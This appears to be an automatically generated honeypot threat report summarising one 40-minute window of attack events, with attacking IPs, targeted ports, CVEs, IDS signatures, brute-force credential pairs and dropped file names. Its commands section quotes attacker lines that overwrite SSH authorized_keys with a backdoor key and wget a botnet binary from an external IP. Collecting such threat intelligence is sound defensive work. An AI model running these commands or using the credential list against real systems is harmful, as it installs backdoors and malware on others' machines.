Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-09T15:01:31Z
**Timeframe:** 2025-10-09T14:20:01Z to 2025-10-09T15:00:01Z
**Files Used:**
- agg_log_20251009T142001Z.json
- agg_log_20251009T144001Z.json
- agg_log_20251009T150001Z.json

**Executive Summary:**
This report summarizes 26,414 events collected from the honeypot network. The majority of attacks were detected by the Cowrie and Suricata honeypots. A significant number of attacks targeted the SMB protocol on TCP port 445 and SSH on port 22. Attackers were observed attempting to install backdoors, scan for vulnerabilities, and brute-force credentials. Multiple CVEs were targeted, with a focus on older remote code execution vulnerabilities.

**Detailed Analysis:**

***Attacks by Honeypot:***
- Cowrie: 11,975
- Suricata: 6,014
- Honeytrap: 2,588
- Ciscoasa: 1,675
- Heralding: 1,278
- Mailoney: 875
- Dionaea: 814
- Sentrypeer: 1,013
- H0neytr4p: 54
- Tanner: 65
- Redishoneypot: 20
- ConPot: 13
- Adbhoney: 8
- ElasticPot: 5
- Honeyaml: 7
- Ipphoney: 5
- Dicompot: 3
- Medpot: 2

***Top Attacking IPs:***
- 167.250.224.25
- 123.52.27.114
- 221.180.19.45
- 188.253.1.20
- 47.100.73.98
- 10.208.0.3
- 86.54.42.238
- 80.94.95.238
- 85.235.152.124
- 78.31.71.38
- 62.148.227.117
- 113.45.38.160
- 8.219.56.235
- 64.227.128.35
- 10.140.0.3
- 197.243.14.52
- 103.144.87.192
- 117.50.70.125
- 36.89.28.139
- 103.171.85.186

***Top Targeted Ports/Protocols:***
- TCP/445
- 22
- vnc/5900
- 5060
- 25
- 445
- 5903
- 8333
- 23
- 5038
- 80
- 443
- TCP/22

***Most Common CVEs:***
- CVE-2002-0013 CVE-2002-0012
- CVE-2021-3449 CVE-2021-3449
- CVE-2019-11500 CVE-2019-11500
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2019-12263 CVE-2019-12261 CVE-2019-12260 CVE-2019-12255
- CVE-2001-0414
- CVE-2002-1149

***Commands Attempted by Attackers:***
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `Enter new UNIX password:`
- `cat /proc/cpuinfo | grep name | wc -l`
- `uname -a`
- `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `ls -lh $(which ls)`
- `which ls`
- `crontab -l`
- `w`
- `uname -m`
- `cat /proc/cpuinfo | grep model | grep name | wc -l`
- `top`
- `uname`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

***Signatures Triggered:***
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- 2024766
- ET INFO VNC Authentication Failure
- 2002920
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- 2023753
- ET DROP Dshield Block Listed Source group 1
- 2402000
- ET SCAN NMAP -sS window 1024
- 2009582
- ET SCAN Potential SSH Scan
- 2001219
- ET HUNTING RDP Authentication Bypass Attempt
- 2034857
- ET INFO Reserved Internal IP Traffic
- 2002752
- ET VOIP Possible Inbound VOIP Scan/Misuse With User-Agent Zoiper
- 2012297
- ET CINS Active Threat Intelligence Poor Reputation IP group 67
- 2403366

***Users / Login Attempts:***
- /Passw0rd
- 345gs5662d34/345gs5662d34
- unknown/999
- root/letmein
- supervisor/3333333
- debian/debian00
- root/root00
- default/default77
- root/r00t123
- root/User1234
- root/User12345
- root/User123456
- root/User2023
- root/User2024
- root/User2025
- root/Voip@12345
- root/Voip@123456
- support/123456789a

***Files Uploaded/Downloaded:***
- 11
- fonts.gstatic.com
- css?family=Libre+Franklin...
- ie8.css?ver=1.0
- html5.js?ver=3.7.3
- arm.urbotnetisass;
- arm.urbotnetisass
- arm5.urbotnetisass;
- arm5.urbotnetisass
- arm6.urbotnetisass;
- arm6.urbotnetisass
- arm7.urbotnetisass;
- arm7.urbotnetisass
- x86_32.urbotnetisass;
- x86_32.urbotnetisass
- mips.urbotnetisass;
- mips.urbotnetisass
- mipsel.urbotnetisass;
- mipsel.urbotnetisass

***HTTP User-Agents:***
- N/A

***SSH Clients and Servers:***
- N/A

***Top Attacker AS Organizations:***
- N/A

**Key Observations and Anomalies:**
- A high volume of attacks are attributed to a small number of IP addresses, suggesting targeted attacks or botnet activity.
- The most common commands are reconnaissance commands, which indicates that attackers are trying to understand the system they have compromised.
- The presence of commands to download and execute files with names like "arm.urbotnetisass" suggests attempts to install malware for various architectures.
- The "DoublePulsar Backdoor" signature was triggered a large number of times, indicating a focus on exploiting the EternalBlue vulnerability.
- There is a significant amount of VNC and RDP scanning, showing interest in remote access services.
